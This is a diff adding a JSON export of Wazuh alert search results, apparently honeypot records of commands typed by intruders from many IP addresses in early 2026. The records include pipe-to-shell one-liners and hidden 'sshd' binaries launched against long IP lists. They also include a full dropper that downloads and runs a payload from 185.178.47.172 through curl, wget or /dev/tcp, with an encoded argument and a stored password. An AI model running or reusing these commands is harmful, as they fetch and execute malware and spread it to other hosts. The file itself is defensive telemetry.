@@ -1,0 +1,369 @@
+{
+  "took": 9,
+  "timed_out": false,
+  "_shards": {
+    "total": 69,
+    "successful": 69,
+    "skipped": 18,
+    "failed": 0
+  },
+  "hits": {
+    "total": {
+      "value": 19,
+      "relation": "eq"
+    },
+    "max_score": null,
+    "hits": [
+      {
+        "_index": "wazuh-alerts-4.x-2026.02.07",
+        "_id": "dINnNZwBqKT4JYUJQc_S",
+        "_score": null,
+        "_source": {
+          "data": {
+            "src_ip": "38.253.149.48",
+            "input": "wget http://example.com/a",
+            "session": "d551635be010",
+            "message": "CMD: wget http://example.com/a"
+          },
+          "timestamp": "2026-02-07T00:01:16.679+0000"
+        },
+        "sort": [
+          1770422476679
+        ]
+      },
+      {
+        "_index": "wazuh-alerts-4.x-2026.02.07",
+        "_id": "dYNnNZwBqKT4JYUJQc_S",
+        "_score": null,
+        "_source": {
+          "data": {
+            "src_ip": "38.253.149.48",
+            "input": "curl http://example.com/a",
+            "session": "d551635be010",
+            "message": "CMD: curl http://example.com/a"
+          },
+          "timestamp": "2026-02-07T00:01:16.679+0000"
+        },
+        "sort": [
+          1770422476679
+        ]
+      },
+      {
+        "_index": "wazuh-alerts-4.x-2026.02.07",
+        "_id": "o4OWNZwBqKT4JYUJVNEt",
+        "_score": null,
+        "_source": {
+          "data": {
+            "src_ip": "38.253.149.48",
+            "input": "bash",
+            "session": "1498e7077119",
+            "message": "CMD: bash"
+          },
+          "timestamp": "2026-02-07T00:52:48.858+0000"
+        },
+        "sort": [
+          1770425568858
+        ]
+      },
+      {
+        "_index": "wazuh-alerts-4.x-2026.02.07",
+        "_id": "pYOWNZwBqKT4JYUJb9GG",
+        "_score": null,
+        "_source": {
+          "data": {
+            "src_ip": "38.253.149.48",
+            "input": "chmod +a",
+            "session": "1498e7077119",
+            "message": "CMD: chmod +a"
+          },
+          "timestamp": "2026-02-07T00:52:52.858+0000"
+        },
+        "sort": [
+          1770425572858
+        ]
+      },
+      {
+        "_index": "wazuh-alerts-4.x-2026.02.07",
+        "_id": "p4OWNZwBqKT4JYUJitHf",
+        "_score": null,
+        "_source": {
+          "data": {
+            "src_ip": "38.253.149.48",
+            "input": "python",
+            "session": "1498e7077119",
+            "message": "CMD: python"
+          },
+          "timestamp": "2026-02-07T00:53:00.859+0000"
+        },
+        "sort": [
+          1770425580859
+        ]
+      },
+      {
+        "_index": "wazuh-alerts-4.x-2026.02.07",
+        "_id": "U4O7NZwBqKT4JYUJCtPX",
+        "_score": null,
+        "_source": {
+          "data": {
+            "src_ip": "38.253.149.48",
+            "input": "input:\"curl http://x | sh\"",
+            "session": "7be0e36c8e57",
+            "message": "CMD: input:\"curl http://x | sh\""
+          },
+          "timestamp": "2026-02-07T01:32:51.039+0000"
+        },
+        "sort": [
+          1770427971039
+        ]
+      },
+      {
+        "_index": "wazuh-alerts-4.x-2026.02.07",
+        "_id": "VoO7NZwBqKT4JYUJJtMw",
+        "_score": null,
+        "_source": {
+          "data": {
+            "src_ip": "38.253.149.48",
+            "input": "curl http://x | sh",
+            "session": "7be0e36c8e57",
+            "message": "CMD: curl http://x | sh"
+          },
+          "timestamp": "2026-02-07T01:32:59.040+0000"
+        },
+        "sort": [
+          1770427979040
+        ]
+      },
+      {
+        "_index": "wazuh-alerts-4.x-2026.02.20",
+        "_id": "xx4ZfJwBUuRA03QtO_Dz",
+        "_score": null,
+        "_source": {
+          "data": {
+            "src_ip": "158.51.96.38",
+            "input": "chmod +x ./.7178163538414610265/sshd;nohup ./.7178163538414610265/sshd 121.224.5.228 100.34.10.200 159.203.35.6 182.43.19.187 195.133.39.138 103.61.122.229 188.75.78.134 43.224.248.178 170.84.39.236 62.60.213.108 217.198.190.83 180.163.61.238 117.138.112.7 170.150.255.26 180.76.138.139 50.6.230.112 13.113.191.54 122.225.202.150 103.161.16.196 116.26.6.99 62.72.1.151 157.66.27.202 157.173.109.86 82.65.98.174 43.156.10.73 47.236.59.210 3.113.28.127 61.53.69.210 212.80.8.189 154.82.73.111 18.60.184.75 116.30.120.29 76.13.124.9 69.87.207.133 154.219.104.82 202.129.205.122 161.97.64.60 45.148.119.184 41.93.28.4 45.81.23.49 103.210.22.17 87.251.19.5 159.203.108.39 185.231.113.31 106.15.108.69 94.182.131.177 113.116.57.50 37.59.103.140 220.181.172.244 50.116.42.95 107.174.88.160 &",
+            "session": "8685b12a38f5",
+            "message": "CMD: chmod +x ./.7178163538414610265/sshd;nohup ./.7178163538414610265/sshd 121.224.5.228 100.34.10.200 159.203.35.6 182.43.19.187 195.133.39.138 103.61.122.229 188.75.78.134 43.224.248.178 170.84.39.236 62.60.213.108 217.198.190.83 180.163.61.238 117.138.112.7 170.150.255.26 180.76.138.139 50.6.230.112 13.113.191.54 122.225.202.150 103.161.16.196 116.26.6.99 62.72.1.151 157.66.27.202 157.173.109.86 82.65.98.174 43.156.10.73 47.236.59.210 3.113.28.127 61.53.69.210 212.80.8.189 154.82.73.111 18.60.184.75 116.30.120.29 76.13.124.9 69.87.207.133 154.219.104.82 202.129.205.122 161.97.64.60 45.148.119.184 41.93.28.4 45.81.23.49 103.210.22.17 87.251.19.5 159.203.108.39 185.231.113.31 106.15.108.69 94.182.131.177 113.116.57.50 37.59.103.140 220.181.172.244 50.116.42.95 107.174.88.160 &"
+          },
+          "timestamp": "2026-02-20T17:29:13.049+0000"
+        },
+        "sort": [
+          1771608553049
+        ]
+      },
+      {
+        "_index": "wazuh-alerts-4.x-2026.02.22",
+        "_id": "HjGbhJwBUuRA03QtBYqN",
+        "_score": null,
+        "_source": {
+          "data": {
+            "src_ip": "44.229.183.170",
+            "input": "chmod +x ./.8771008875350927523/sshd;nohup ./.8771008875350927523/sshd 160.176.200.202 142.93.71.3 180.76.137.24 1.165.130.253 125.212.248.44 120.224.42.110 156.227.233.78 112.67.250.54 117.138.112.7 187.141.210.92 87.121.47.25 221.213.196.23 141.95.165.78 103.161.16.196 101.69.132.194 185.18.215.70 178.239.114.194 186.13.21.145 103.218.243.223 103.61.122.197 111.39.174.175 69.87.207.135 106.74.27.94 203.186.60.250 160.251.209.193 162.241.29.37 86.111.189.27 103.214.4.71 120.220.197.178 103.147.14.26 45.118.144.36 159.203.108.2 103.147.14.179 87.251.19.5 148.72.168.29 58.22.105.66 88.151.34.218 123.234.3.106 134.122.95.87 115.231.220.63 180.76.138.139 116.26.39.130 50.6.231.169 67.217.228.7 125.74.128.224 8.219.93.246 184.70.94.130 61.53.69.210 220.194.79.36 125.208.17.145 41.93.28.4 &",
+            "session": "fa54846ba8be",
+            "message": "CMD: chmod +x ./.8771008875350927523/sshd;nohup ./.8771008875350927523/sshd 160.176.200.202 142.93.71.3 180.76.137.24 1.165.130.253 125.212.248.44 120.224.42.110 156.227.233.78 112.67.250.54 117.138.112.7 187.141.210.92 87.121.47.25 221.213.196.23 141.95.165.78 103.161.16.196 101.69.132.194 185.18.215.70 178.239.114.194 186.13.21.145 103.218.243.223 103.61.122.197 111.39.174.175 69.87.207.135 106.74.27.94 203.186.60.250 160.251.209.193 162.241.29.37 86.111.189.27 103.214.4.71 120.220.197.178 103.147.14.26 45.118.144.36 159.203.108.2 103.147.14.179 87.251.19.5 148.72.168.29 58.22.105.66 88.151.34.218 123.234.3.106 134.122.95.87 115.231.220.63 180.76.138.139 116.26.39.130 50.6.231.169 67.217.228.7 125.74.128.224 8.219.93.246 184.70.94.130 61.53.69.210 220.194.79.36 125.208.17.145 41.93.28.4 &"
+          },
+          "timestamp": "2026-02-22T09:07:56.437+0000"
+        },
+        "sort": [
+          1771751276437
+        ]
+      },
+      {
+        "_index": "wazuh-alerts-4.x-2026.02.22",
+        "_id": "fjL0hJwBUuRA03QtW1gc",
+        "_score": null,
+        "_source": {
+          "data": {
+            "src_ip": "78.110.123.75",
+            "input": "chmod +x ./.699915910715774397/sshd;nohup ./.699915910715774397/sshd 36.163.199.18 103.39.222.143 154.66.196.87 120.224.42.110 103.61.122.229 41.93.28.4 150.242.81.115 180.76.137.24 46.29.238.140 115.127.4.4 158.51.96.38 185.79.158.198 185.92.182.201 45.81.23.49 161.97.187.226 134.122.155.131 180.76.225.49 43.224.248.178 15.235.134.206 161.97.84.142 159.203.108.39 221.213.196.23 106.15.108.69 103.142.86.12 115.231.161.253 195.206.234.25 223.75.204.39 154.82.73.111 221.178.246.21 45.118.144.36 183.94.33.160 69.87.207.133 95.217.106.90 47.95.170.168 156.227.232.33 45.55.30.94 190.131.205.149 116.128.243.59 111.203.190.237 120.224.42.108 220.170.52.145 103.147.14.105 115.231.181.61 134.122.8.206 177.10.201.11 122.10.115.18 107.172.235.125 95.217.75.56 83.168.105.145 184.70.94.130 86.111.189.27 &",
+            "session": "d987576b18da",
+            "message": "CMD: chmod +x ./.699915910715774397/sshd;nohup ./.699915910715774397/sshd 36.163.199.18 103.39.222.143 154.66.196.87 120.224.42.110 103.61.122.229 41.93.28.4 150.242.81.115 180.76.137.24 46.29.238.140 115.127.4.4 158.51.96.38 185.79.158.198 185.92.182.201 45.81.23.49 161.97.187.226 134.122.155.131 180.76.225.49 43.224.248.178 15.235.134.206 161.97.84.142 159.203.108.39 221.213.196.23 106.15.108.69 103.142.86.12 115.231.161.253 195.206.234.25 223.75.204.39 154.82.73.111 221.178.246.21 45.118.144.36 183.94.33.160 69.87.207.133 95.217.106.90 47.95.170.168 156.227.232.33 45.55.30.94 190.131.205.149 116.128.243.59 111.203.190.237 120.224.42.108 220.170.52.145 103.147.14.105 115.231.181.61 134.122.8.206 177.10.201.11 122.10.115.18 107.172.235.125 95.217.75.56 83.168.105.145 184.70.94.130 86.111.189.27 &"
+          },
+          "timestamp": "2026-02-22T10:45:28.880+0000"
+        },
+        "sort": [
+          1771757128880
+        ]
+      },
+      {
+        "_index": "wazuh-alerts-4.x-2026.02.24",
+        "_id": "Il4NkZwBkLkmPFePxFR8",
+        "_score": null,
+        "_source": {
+          "data": {
+            "src_ip": "59.185.230.105",
+            "input": "chmod +x ./.8207484371276707755/sshd;nohup ./.8207484371276707755/sshd  &",
+            "session": "5dbae4a990d1",
+            "message": "CMD: chmod +x ./.8207484371276707755/sshd;nohup ./.8207484371276707755/sshd  &"
+          },
+          "GeoLocation": {
+            "country_name": "India"
+          },
+          "timestamp": "2026-02-24T19:08:38.512+0000"
+        },
+        "sort": [
+          1771960118512
+        ]
+      },
+      {
+        "_index": "wazuh-alerts-4.x-2026.02.26",
+        "_id": "CnyRl5wBkLkmPFeP7iid",
+        "_score": null,
+        "_source": {
+          "data": {
+            "src_ip": "103.114.160.232",
+            "input": "chmod +x ./.8323126285710087351/sshd;nohup ./.8323126285710087351/sshd 133.88.116.150 103.61.122.229 50.3.189.31 111.39.174.175 121.224.5.228 183.224.79.111 61.53.69.210 220.181.172.244 122.10.115.18 138.197.163.192 159.203.108.2 103.239.252.132 182.201.244.26 103.166.226.235 101.251.176.134 103.54.101.248 47.236.251.100 42.51.49.239 120.92.105.170 156.227.232.33 220.170.52.145 43.247.68.87 173.212.198.248 180.76.192.80 178.160.228.51 101.132.33.119 50.6.230.112 51.15.19.10 50.6.229.52 85.133.221.252 120.48.7.234 156.227.233.78 158.51.96.38 165.227.171.166 161.97.84.142 51.210.149.136 161.97.166.26 176.215.176.101 180.76.167.130 206.189.206.75 58.22.105.66 218.205.37.160 185.228.234.6 103.210.22.17 183.233.148.8 34.173.87.191 101.69.132.194 222.223.177.118 103.147.14.26 180.76.138.139 103.142.86.12 &",
+            "session": "68a060f91906",
+            "message": "CMD: chmod +x ./.8323126285710087351/sshd;nohup ./.8323126285710087351/sshd 133.88.116.150 103.61.122.229 50.3.189.31 111.39.174.175 121.224.5.228 183.224.79.111 61.53.69.210 220.181.172.244 122.10.115.18 138.197.163.192 159.203.108.2 103.239.252.132 182.201.244.26 103.166.226.235 101.251.176.134 103.54.101.248 47.236.251.100 42.51.49.239 120.92.105.170 156.227.232.33 220.170.52.145 43.247.68.87 173.212.198.248 180.76.192.80 178.160.228.51 101.132.33.119 50.6.230.112 51.15.19.10 50.6.229.52 85.133.221.252 120.48.7.234 156.227.233.78 158.51.96.38 165.227.171.166 161.97.84.142 51.210.149.136 161.97.166.26 176.215.176.101 180.76.167.130 206.189.206.75 58.22.105.66 218.205.37.160 185.228.234.6 103.210.22.17 183.233.148.8 34.173.87.191 101.69.132.194 222.223.177.118 103.147.14.26 180.76.138.139 103.142.86.12 &"
+          },
+          "GeoLocation": {
+            "country_name": "Singapore"
+          },
+          "timestamp": "2026-02-26T01:30:44.951+0000"
+        },
+        "sort": [
+          1772069444951
+        ]
+      },
+      {
+        "_index": "wazuh-alerts-4.x-2026.02.26",
+        "_id": "3Il0m5wBkLkmPFePK1_R",
+        "_score": null,
+        "_source": {
+          "data": {
+            "src_ip": "188.32.210.218",
+            "input": "chmod +x ./.1020298343685561134/sshd;nohup ./.1020298343685561134/sshd  &",
+            "session": "c6ee6b8e53c8",
+            "message": "CMD: chmod +x ./.1020298343685561134/sshd;nohup ./.1020298343685561134/sshd  &"
+          },
+          "GeoLocation": {
+            "country_name": "Russia"
+          },
+          "timestamp": "2026-02-26T19:36:43.035+0000"
+        },
+        "sort": [
+          1772134603035
+        ]
+      },
+      {
+        "_index": "wazuh-alerts-4.x-2026.02.27",
+        "_id": "_JkYn5wBkLkmPFePNpyk",
+        "_score": null,
+        "_source": {
+          "data": {
+            "src_ip": "121.28.170.66",
+            "input": "chmod +x ./.2430654486045462639/sshd;nohup ./.2430654486045462639/sshd 118.196.44.117 156.227.232.33 45.225.204.5 49.233.95.165 173.212.211.112 103.188.82.254 47.236.178.171 106.15.108.69 185.173.106.22 46.38.150.35 178.160.228.51 115.190.87.147 160.25.89.98 50.6.172.32 45.9.150.250 103.143.11.137 177.10.201.11 206.189.206.75 50.3.189.31 106.13.27.219 111.6.14.234 103.121.91.144 79.120.74.12 101.91.114.194 65.181.92.228 156.227.233.76 36.137.79.219 18.163.8.163 88.151.34.218 8.219.93.246 101.36.228.201 113.108.2.114 134.122.155.131 103.61.122.229 1.53.110.72 51.15.19.10 106.74.27.94 39.98.59.70 170.84.39.236 23.165.104.184 43.247.68.87 108.181.168.74 93.170.72.100 36.134.34.142 154.92.131.42 148.72.168.29 117.138.112.7 86.111.189.27 143.198.24.202 113.108.2.117 46.245.95.246 &",
+            "session": "2d41d9c87799",
+            "message": "CMD: chmod +x ./.2430654486045462639/sshd;nohup ./.2430654486045462639/sshd 118.196.44.117 156.227.232.33 45.225.204.5 49.233.95.165 173.212.211.112 103.188.82.254 47.236.178.171 106.15.108.69 185.173.106.22 46.38.150.35 178.160.228.51 115.190.87.147 160.25.89.98 50.6.172.32 45.9.150.250 103.143.11.137 177.10.201.11 206.189.206.75 50.3.189.31 106.13.27.219 111.6.14.234 103.121.91.144 79.120.74.12 101.91.114.194 65.181.92.228 156.227.233.76 36.137.79.219 18.163.8.163 88.151.34.218 8.219.93.246 101.36.228.201 113.108.2.114 134.122.155.131 103.61.122.229 1.53.110.72 51.15.19.10 106.74.27.94 39.98.59.70 170.84.39.236 23.165.104.184 43.247.68.87 108.181.168.74 93.170.72.100 36.134.34.142 154.92.131.42 148.72.168.29 117.138.112.7 86.111.189.27 143.198.24.202 113.108.2.117 46.245.95.246 &"
+          },
+          "GeoLocation": {
+            "country_name": "China"
+          },
+          "timestamp": "2026-02-27T12:34:45.708+0000"
+        },
+        "sort": [
+          1772195685708
+        ]
+      },
+      {
+        "_index": "wazuh-alerts-4.x-2026.02.27",
+        "_id": "XKtroJwBkLkmPFeP-j-8",
+        "_score": null,
+        "_source": {
+          "data": {
+            "src_ip": "123.58.212.100",
+            "input": "chmod +x ./.6431615505498665513/sshd;nohup ./.6431615505498665513/sshd 103.231.253.70 222.223.177.118 103.121.91.144 195.206.234.25 43.224.248.178 103.147.14.105 118.196.44.117 134.122.177.2 217.217.255.70 184.70.94.130 69.87.207.135 157.66.27.202 134.122.8.206 45.55.30.94 1.62.252.20 182.201.244.26 87.251.19.5 51.79.104.129 47.236.251.100 117.198.218.187 220.181.172.244 143.198.27.218 42.51.49.239 50.3.189.31 36.137.79.219 159.203.35.6 46.245.95.246 122.10.115.18 160.25.89.98 218.205.37.160 221.178.246.21 178.160.228.51 107.172.235.125 156.227.233.76 156.227.233.78 176.215.176.101 147.139.170.74 106.75.71.120 222.95.84.220 182.43.19.187 148.113.13.250 143.198.24.202 187.141.210.92 37.60.244.157 117.138.112.7 115.231.161.253 220.194.79.36 103.54.101.248 112.67.250.54 96.44.170.208 133.88.116.150 &",
+            "session": "cc626db22226",
+            "message": "CMD: chmod +x ./.6431615505498665513/sshd;nohup ./.6431615505498665513/sshd 103.231.253.70 222.223.177.118 103.121.91.144 195.206.234.25 43.224.248.178 103.147.14.105 118.196.44.117 134.122.177.2 217.217.255.70 184.70.94.130 69.87.207.135 157.66.27.202 134.122.8.206 45.55.30.94 1.62.252.20 182.201.244.26 87.251.19.5 51.79.104.129 47.236.251.100 117.198.218.187 220.181.172.244 143.198.27.218 42.51.49.239 50.3.189.31 36.137.79.219 159.203.35.6 46.245.95.246 122.10.115.18 160.25.89.98 218.205.37.160 221.178.246.21 178.160.228.51 107.172.235.125 156.227.233.76 156.227.233.78 176.215.176.101 147.139.170.74 106.75.71.120 222.95.84.220 182.43.19.187 148.113.13.250 143.198.24.202 187.141.210.92 37.60.244.157 117.138.112.7 115.231.161.253 220.194.79.36 103.54.101.248 112.67.250.54 96.44.170.208 133.88.116.150 &"
+          },
+          "GeoLocation": {
+            "country_name": "China"
+          },
+          "timestamp": "2026-02-27T18:45:55.441+0000"
+        },
+        "sort": [
+          1772217955441
+        ]
+      },
+      {
+        "_index": "wazuh-alerts-4.x-2026.02.28",
+        "_id": "g7jtoZwBkLkmPFeP4G6P",
+        "_score": null,
+        "_source": {
+          "data": {
+            "src_ip": "4.18.104.26",
+            "input": "chmod +x ./.2628368383498328690/sshd;nohup ./.2628368383498328690/sshd 4.18.104.26 4.4.66.82 &",
+            "session": "850124c31034",
+            "message": "CMD: chmod +x ./.2628368383498328690/sshd;nohup ./.2628368383498328690/sshd 4.18.104.26 4.4.66.82 &"
+          },
+          "GeoLocation": {
+            "country_name": "United States"
+          },
+          "timestamp": "2026-02-28T01:47:17.467+0000"
+        },
+        "sort": [
+          1772243237467
+        ]
+      },
+      {
+        "_index": "wazuh-alerts-4.x-2026.03.01",
+        "_id": "B9e7q5wBkLkmPFePTmqN",
+        "_score": null,
+        "_source": {
+          "data": {
+            "src_ip": "222.89.138.40",
+            "input": "chmod +x ./.2613357111673171429/sshd;nohup ./.2613357111673171429/sshd  &",
+            "session": "5c5c964afe5d",
+            "message": "CMD: chmod +x ./.2613357111673171429/sshd;nohup ./.2613357111673171429/sshd  &"
+          },
+          "GeoLocation": {
+            "country_name": "China"
+          },
+          "timestamp": "2026-03-01T23:28:14.112+0000"
+        },
+        "sort": [
+          1772407694112
+        ]
+      },
+      {
+        "_index": "wazuh-alerts-4.x-2026.03.03",
+        "_id": "SKJDs5wBAk5vx9H2MfJZ",
+        "_score": null,
+        "_source": {
+          "data": {
+            "src_ip": "211.41.109.56",
+            "input": """nohup $SHELL -c "curl http://185.178.47.172:60149/linux -o /tmp/P2RZtzVYgY; if [ ! -f /tmp/P2RZtzVYgY ]; then wget http://185.178.47.172:60149/linux -O /tmp/P2RZtzVYgY; fi; if [ ! -f /tmp/P2RZtzVYgY ]; then exec 6<>/dev/tcp/185.178.47.172/60149 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/P2RZtzVYgY ; chmod +x /tmp/P2RZtzVYgY && /tmp/P2RZtzVYgY 0Rs402sKjjZLGFAFOhI5ESIDUxlVIoMWd9Y+Fa2rDyLVcAiBNFUYUwI0HzcFJgZWB1M7lQl21zYNrK0IOcR2AZUzVRxMAicdLhkkB1gfVTOJCGXVPQmyqhU+02sKijVfH1ICJh8gGC0dUxxXLIoJcco+C66mDTzVdQ2bM1AQTAEmGC4ZJANMH1E4jQh00D8bqKsVPtd8Fo8wSxtTBy4dMBomAEIRSzOPCGvWPw+yrQg63nMIijJQCVMBIQU5GDoCWhlLNokCc9Q9D6+8DzvKdwyILFcRTAIjGjodJAJRGkUzgw1r1TsDsqgMItVyCoE0VRhWCjQfNwUmAFsHVzeIFn3TNg2srQg0xHEPlTNXGUwGIQUzEi4FUhhRMJsMcso0DbKtDDrKcAiBNFUYVgY0Ey4ZJQtMG1c3lQx33joLrawKLNByFow0SxtTAjoTOBEiA1MaVCKJCXTKOAqyrQs1ynAOgTRVGFADNBo1EjoBUBpLMIsIa9I4AaqsCjjXZQmKM0sYUx0lEy4aLARYH1UziAtl0SIJrKoVPtZyFog1Xx9SAiAfIBohAUweVSyJCX3KPQytpg081XcAmzNVGEwCJxkuGSAHTBhcOoEOddU9DrykFT7VfRaJMVEHVwMuHTAaJwNCHVIsgwtr1jwIsq0DP95zCIoxXQlWBDoaMhs6BlcHVjuBDnXVOAm8rQg1ynQOiSxXGlAdLRI6HSQCUx9FM4kJa9A8Fa6vCiLVdw2BNFUYUAs0HDIFIgNMHF0sgwB/0jwKqKgbONNrCog6SxhVCjoaNBkuBVIYVDr/y2GAzQWtrDO0hkhs/CDXeHvknVauFj2IZG3wYxUI; fi; echo Aa@123456 > /tmp/.opass; chmod +x /tmp/P2RZtzVYgY && /tmp/P2RZtzVYgY 0Rs402sKjjZLGFAFOhI5ESIDUxlVIoMWd9Y+Fa2rDyLVcAiBNFUYUwI0HzcFJgZWB1M7lQl21zYNrK0IOcR2AZUzVRxMAicdLhkkB1gfVTOJCGXVPQmyqhU+02sKijVfH1ICJh8gGC0dUxxXLIoJcco+C66mDTzVdQ2bM1AQTAEmGC4ZJANMH1E4jQh00D8bqKsVPtd8Fo8wSxtTBy4dMBomAEIRSzOPCGvWPw+yrQg63nMIijJQCVMBIQU5GDoCWhlLNokCc9Q9D6+8DzvKdwyILFcRTAIjGjodJAJRGkUzgw1r1TsDsqgMItVyCoE0VRhWCjQfNwUmAFsHVzeIFn3TNg2srQg0xHEPlTNXGUwGIQUzEi4FUhhRMJsMcso0DbKtDDrKcAiBNFUYVgY0Ey4ZJQtMG1c3lQx33joLrawKLNByFow0SxtTAjoTOBEiA1MaVCKJCXTKOAqyrQs1ynAOgTRVGFADNBo1EjoBUBpLMIsIa9I4AaqsCjjXZQmKM0sYUx0lEy4aLARYH1UziAtl0SIJrKoVPtZyFog1Xx9SAiAfIBohAUweVSyJCX3KPQytpg081XcAmzNVGEwCJxkuGSAHTBhcOoEOddU9DrykFT7VfRaJMVEHVwMuHTAaJwNCHVIsgwtr1jwIsq0DP95zCIoxXQlWBDoaMhs6BlcHVjuBDnXVOAm8rQg1ynQOiSxXGlAdLRI6HSQCUx9FM4kJa9A8Fa6vCiLVdw2BNFUYUAs0HDIFIgNMHF0sgwB/0jwKqKgbONNrCog6SxhVCjoaNBkuBVIYVDr/y2GAzQWtrDO0hkhs/CDXeHvknVauFj2IZG3wYxUI" &""",
+            "session": "3f3f74125c70",
+            "message": """CMD: nohup $SHELL -c "curl http://185.178.47.172:60149/linux -o /tmp/P2RZtzVYgY; if [ ! -f /tmp/P2RZtzVYgY ]; then wget http://185.178.47.172:60149/linux -O /tmp/P2RZtzVYgY; fi; if [ ! -f /tmp/P2RZtzVYgY ]; then exec 6<>/dev/tcp/185.178.47.172/60149 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/P2RZtzVYgY ; chmod +x /tmp/P2RZtzVYgY && /tmp/P2RZtzVYgY 0Rs402sKjjZLGFAFOhI5ESIDUxlVIoMWd9Y+Fa2rDyLVcAiBNFUYUwI0HzcFJgZWB1M7lQl21zYNrK0IOcR2AZUzVRxMAicdLhkkB1gfVTOJCGXVPQmyqhU+02sKijVfH1ICJh8gGC0dUxxXLIoJcco+C66mDTzVdQ2bM1AQTAEmGC4ZJANMH1E4jQh00D8bqKsVPtd8Fo8wSxtTBy4dMBomAEIRSzOPCGvWPw+yrQg63nMIijJQCVMBIQU5GDoCWhlLNokCc9Q9D6+8DzvKdwyILFcRTAIjGjodJAJRGkUzgw1r1TsDsqgMItVyCoE0VRhWCjQfNwUmAFsHVzeIFn3TNg2srQg0xHEPlTNXGUwGIQUzEi4FUhhRMJsMcso0DbKtDDrKcAiBNFUYVgY0Ey4ZJQtMG1c3lQx33joLrawKLNByFow0SxtTAjoTOBEiA1MaVCKJCXTKOAqyrQs1ynAOgTRVGFADNBo1EjoBUBpLMIsIa9I4AaqsCjjXZQmKM0sYUx0lEy4aLARYH1UziAtl0SIJrKoVPtZyFog1Xx9SAiAfIBohAUweVSyJCX3KPQytpg081XcAmzNVGEwCJxkuGSAHTBhcOoEOddU9DrykFT7VfRaJMVEHVwMuHTAaJwNCHVIsgwtr1jwIsq0DP95zCIoxXQlWBDoaMhs6BlcHVjuBDnXVOAm8rQg1ynQOiSxXGlAdLRI6HSQCUx9FM4kJa9A8Fa6vCiLVdw2BNFUYUAs0HDIFIgNMHF0sgwB/0jwKqKgbONNrCog6SxhVCjoaNBkuBVIYVDr/y2GAzQWtrDO0hkhs/CDXeHvknVauFj2IZG3wYxUI; fi; echo Aa@123456 > /tmp/.opass; chmod +x /tmp/P2RZtzVYgY && /tmp/P2RZtzVYgY 0Rs402sKjjZLGFAFOhI5ESIDUxlVIoMWd9Y+Fa2rDyLVcAiBNFUYUwI0HzcFJgZWB1M7lQl21zYNrK0IOcR2AZUzVRxMAicdLhkkB1gfVTOJCGXVPQmyqhU+02sKijVfH1ICJh8gGC0dUxxXLIoJcco+C66mDTzVdQ2bM1AQTAEmGC4ZJANMH1E4jQh00D8bqKsVPtd8Fo8wSxtTBy4dMBomAEIRSzOPCGvWPw+yrQg63nMIijJQCVMBIQU5GDoCWhlLNokCc9Q9D6+8DzvKdwyILFcRTAIjGjodJAJRGkUzgw1r1TsDsqgMItVyCoE0VRhWCjQfNwUmAFsHVzeIFn3TNg2srQg0xHEPlTNXGUwGIQUzEi4FUhhRMJsMcso0DbKtDDrKcAiBNFUYVgY0Ey4ZJQtMG1c3lQx33joLrawKLNByFow0SxtTAjoTOBEiA1MaVCKJCXTKOAqyrQs1ynAOgTRVGFADNBo1EjoBUBpLMIsIa9I4AaqsCjjXZQmKM0sYUx0lEy4aLARYH1UziAtl0SIJrKoVPtZyFog1Xx9SAiAfIBohAUweVSyJCX3KPQytpg081XcAmzNVGEwCJxkuGSAHTBhcOoEOddU9DrykFT7VfRaJMVEHVwMuHTAaJwNCHVIsgwtr1jwIsq0DP95zCIoxXQlWBDoaMhs6BlcHVjuBDnXVOAm8rQg1ynQOiSxXGlAdLRI6HSQCUx9FM4kJa9A8Fa6vCiLVdw2BNFUYUAs0HDIFIgNMHF0sgwB/0jwKqKgbONNrCog6SxhVCjoaNBkuBVIYVDr/y2GAzQWtrDO0hkhs/CDXeHvknVauFj2IZG3wYxUI" &"""
+          },
+          "GeoLocation": {
+            "country_name": "South Korea"
+          },
+          "timestamp": "2026-03-03T10:34:09.918+0000"
+        },
+        "sort": [
+          1772534049918
+        ]
+      },
+      {
+        "_index": "wazuh-alerts-4.x-2026.03.03",
+        "_id": "SaJDs5wBAk5vx9H2MfJZ",
+        "_score": null,
+        "_source": {
+          "data": {
+            "src_ip": "211.41.109.56",
+            "input": """nohup $SHELL -c "curl http://185.178.47.172:60149/linux -o /tmp/P2RZtzVYgY; if [ ! -f /tmp/P2RZtzVYgY ]; then wget http://185.178.47.172:60149/linux -O /tmp/P2RZtzVYgY; fi; if [ ! -f /tmp/P2RZtzVYgY ]; then exec 6<>/dev/tcp/185.178.47.172/60149 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/P2RZtzVYgY ; chmod +x /tmp/P2RZtzVYgY && /tmp/P2RZtzVYgY 0Rs402sKjjZLGFAFOhI5ESIDUxlVIoMWd9Y+Fa2rDyLVcAiBNFUYUwI0HzcFJgZWB1M7lQl21zYNrK0IOcR2AZUzVRxMAicdLhkkB1gfVTOJCGXVPQmyqhU+02sKijVfH1ICJh8gGC0dUxxXLIoJcco+C66mDTzVdQ2bM1AQTAEmGC4ZJANMH1E4jQh00D8bqKsVPtd8Fo8wSxtTBy4dMBomAEIRSzOPCGvWPw+yrQg63nMIijJQCVMBIQU5GDoCWhlLNokCc9Q9D6+8DzvKdwyILFcRTAIjGjodJAJRGkUzgw1r1TsDsqgMItVyCoE0VRhWCjQfNwUmAFsHVzeIFn3TNg2srQg0xHEPlTNXGUwGIQUzEi4FUhhRMJsMcso0DbKtDDrKcAiBNFUYVgY0Ey4ZJQtMG1c3lQx33joLrawKLNByFow0SxtTAjoTOBEiA1MaVCKJCXTKOAqyrQs1ynAOgTRVGFADNBo1EjoBUBpLMIsIa9I4AaqsCjjXZQmKM0sYUx0lEy4aLARYH1UziAtl0SIJrKoVPtZyFog1Xx9SAiAfIBohAUweVSyJCX3KPQytpg081XcAmzNVGEwCJxkuGSAHTBhcOoEOddU9DrykFT7VfRaJMVEHVwMuHTAaJwNCHVIsgwtr1jwIsq0DP95zCIoxXQlWBDoaMhs6BlcHVjuBDnXVOAm8rQg1ynQOiSxXGlAdLRI6HSQCUx9FM4kJa9A8Fa6vCiLVdw2BNFUYUAs0HDIFIgNMHF0sgwB/0jwKqKgbONNrCog6SxhVCjoaNBkuBVIYVDr/y2GAzQWtrDO0hkhs/CDXeHvknVauFj2IZG3wYxUI; fi; echo Aa@123456 > /tmp/.opass; chmod +x /tmp/P2RZtzVYgY && /tmp/P2RZtzVYgY 